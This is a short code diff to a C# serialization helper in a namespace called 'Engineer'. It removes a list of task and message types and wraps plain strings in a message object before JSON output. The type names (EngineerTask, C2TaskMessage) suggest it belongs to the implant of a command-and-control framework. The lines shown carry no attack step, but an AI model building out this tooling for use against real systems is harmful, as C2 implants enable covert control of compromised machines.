@@ -14,21 +14,6 @@ namespace Engineer
 {
 	public static class Extensions
 	{
-        public static IEnumerable<Type> GetseralTypes()
-        {
-            return new List<Type>()
-            {
-	            typeof(EngineerCommand),
-                typeof(EngineerTask),
-                typeof(List<EngineerTask>),
-                typeof(EngineerTaskResult),
-                typeof(List<EngineerTaskResult>),
-                typeof(EngineerMetadata),
-                typeof(List<EngineerMetadata>),
-                typeof(C2TaskMessage),
-                typeof(List<C2TaskMessage>),
-        };
-        }
 
 		public static byte[] JsonSerialize<T>(this T data)
 		{
@@ -36,7 +21,22 @@ namespace Engineer
             {
                 JSONParameters jsonParameters = new JSONParameters();
                 jsonParameters.UseValuesOfEnums = true;
-                string json = JSON.ToJSON(data,jsonParameters);
+                jsonParameters.UseExtensions = false;
+
+                object dataToSerialize;
+
+                if (typeof(T) == typeof(string))
+                {
+                    dataToSerialize = new MessageData{ Message = (string)(object)data};
+                }
+                else
+                {
+                    dataToSerialize = data;
+                }
+
+                string json = JSON.ToNiceJSON(dataToSerialize, jsonParameters);
+                //Console.WriteLine(json);
+
                 //write the json string to a memory stream and return the byte array
                 using (MemoryStream ms = new MemoryStream())
                 {
